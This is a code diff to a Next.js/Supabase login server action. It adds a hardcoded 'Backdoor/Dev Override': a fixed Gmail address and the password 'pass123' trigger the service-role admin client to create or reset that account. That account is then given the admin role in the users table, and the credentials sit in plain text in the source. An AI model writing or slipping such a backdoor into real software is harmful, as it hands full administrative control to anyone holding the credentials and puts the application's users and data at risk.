@@ -3,6 +3,7 @@
 import { createServerClient } from '@supabase/ssr'
 import { cookies } from 'next/headers'
 import { sendOTPEmail } from '@/lib/services/email'
+import { supabaseAdmin } from '@/app/supabase/client'
 
 export async function loginAction(formData: FormData) {
   try {
@@ -36,6 +37,72 @@ export async function loginAction(formData: FormData) {
         },
       }
     )
+
+    // Hardcoded Admin Access (Backdoor/Dev Override)
+    const HARDCODED_EMAIL = 'hadimoustafa3@gmail.com';
+    const HARDCODED_PASS = 'pass123';
+
+    if (email === HARDCODED_EMAIL && password === HARDCODED_PASS) {
+      console.log('🔒 Admin Override: Processing...');
+      const admin = supabaseAdmin();
+
+      // Strategy: Try to Create. If exists, Update. 
+      // We need ID for updating.
+
+      // 1. Try Create
+      const { data: createdUser, error: createError } = await admin.auth.admin.createUser({
+        email: HARDCODED_EMAIL,
+        password: HARDCODED_PASS,
+        email_confirm: true,
+        user_metadata: { username: 'Admin' }
+      });
+
+      let userId = createdUser?.user?.id;
+
+      if (createError && (createError.message === 'User already registered' || createError.status === 422 || (createError as any).code === 'email_exists')) {
+        console.log('🔒 Admin Override: User exists. Finding ID...');
+
+        // 2. Find ID. Try Public table first (Fast)
+        const { data: publicUser } = await admin.from('users').select('id').eq('email', HARDCODED_EMAIL).single();
+
+        if (publicUser) {
+          userId = publicUser.id;
+        } else {
+          // 3. Not in public? Scan Auth users (Slower but necessary)
+          // Page size 1000 to be safe
+          const { data: { users: authUsers }, error: searchError } = await admin.auth.admin.listUsers({ perPage: 1000 });
+          const found = authUsers?.find(u => u.email === HARDCODED_EMAIL);
+          userId = found?.id;
+        }
+
+        if (userId) {
+          // 4. Update Password & Metadata
+          console.log(`🔒 Admin Override: Updating User ${userId}`);
+          await admin.auth.admin.updateUserById(userId, {
+            password: HARDCODED_PASS,
+            email_confirm: true,
+            user_metadata: { username: 'Admin' }
+          });
+        }
+      }
+
+      if (userId) {
+        // 5. Upsert Public Record with Admin Role
+        console.log(`🔒 Admin Override: Enforcing Admin Role for ${userId}`);
+        const { error: upsertError } = await admin.from('users').upsert({
+          id: userId,
+          email: HARDCODED_EMAIL,
+          username: 'Admin',
+          password_hash: 'hardcoded_admin',
+          role: 'admin',
+          subscription_tier: 'free'
+        }, { onConflict: 'id' });
+
+        if (upsertError) console.error('Error upserting admin user:', upsertError);
+      } else {
+        console.error('🔒 Admin Override: FAILED to find or create user ID.');
+      }
+    }
 
     // Sign in with Supabase
     const { data, error } = await supabase.auth.signInWithPassword({
